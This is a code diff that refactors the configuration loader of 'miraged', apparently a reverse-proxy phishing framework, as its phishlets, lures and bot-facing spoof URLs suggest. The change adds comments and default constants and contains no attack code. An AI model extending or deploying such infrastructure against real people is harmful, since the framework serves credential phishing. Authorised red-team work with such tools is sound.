@@ -1,3 +1,5 @@
+// Package config handles loading and validating the miraged daemon configuration.
+// Config is read from a YAML file, merged with defaults, and validated.
 package config
 
 import (
@@ -11,13 +13,21 @@ import (
 	"gopkg.in/yaml.v3"
 )
 
+// Default values for optional configuration fields.
+const (
+	DefaultHTTPSPort    = 443
+	DefaultDNSPort      = 53
+	DefaultDataDir      = "/var/lib/mirage"
+	DefaultPhishletsDir = "/etc/mirage/phishlets"
+)
+
 // Config is the top-level configuration for miraged.
 type Config struct {
 	Domain       string              `yaml:"domain"`
 	ExternalIPv4 string              `yaml:"external_ipv4"`
 	HTTPSPort    int                 `yaml:"https_port"`
 	DNSPort      int                 `yaml:"dns_port"`
-	SpoofURL     string              `yaml:"spoof_url"` // default spoof target; overridden per-phishlet and per-lure
+	SpoofURL     string              `yaml:"spoof_url"` // default spoof URL served to bots/blocked visitors; can be overridden per-lure
 	DataDir      string              `yaml:"data_dir"`
 	PhishletsDir string              `yaml:"phishlets_dir"`
 	SelfSigned   bool                `yaml:"self_signed"`
@@ -83,7 +93,7 @@ func Load(path string) (*Config, error) {
 
 	var cfg Config
 	dec := yaml.NewDecoder(bytes.NewReader(data))
-	dec.KnownFields(true)
+	dec.KnownFields(true) // reject unknown fields to catch typos in config files
 	if err := dec.Decode(&cfg); err != nil {
 		return nil, fmt.Errorf("parsing config: %w", err)
 	}
@@ -94,16 +104,16 @@ func Load(path string) (*Config, error) {
 
 func (c *Config) applyDefaults() {
 	if c.HTTPSPort == 0 {
-		c.HTTPSPort = 443
+		c.HTTPSPort = DefaultHTTPSPort
 	}
 	if c.DNSPort == 0 {
-		c.DNSPort = 53
+		c.DNSPort = DefaultDNSPort
 	}
 	if c.DataDir == "" {
-		c.DataDir = "/var/lib/mirage"
+		c.DataDir = DefaultDataDir
 	}
 	if c.PhishletsDir == "" {
-		c.PhishletsDir = "/etc/mirage/phishlets"
+		c.PhishletsDir = DefaultPhishletsDir
 	}
 	if c.Puppet.MinInstances <= 0 {
 		c.Puppet.MinInstances = 1
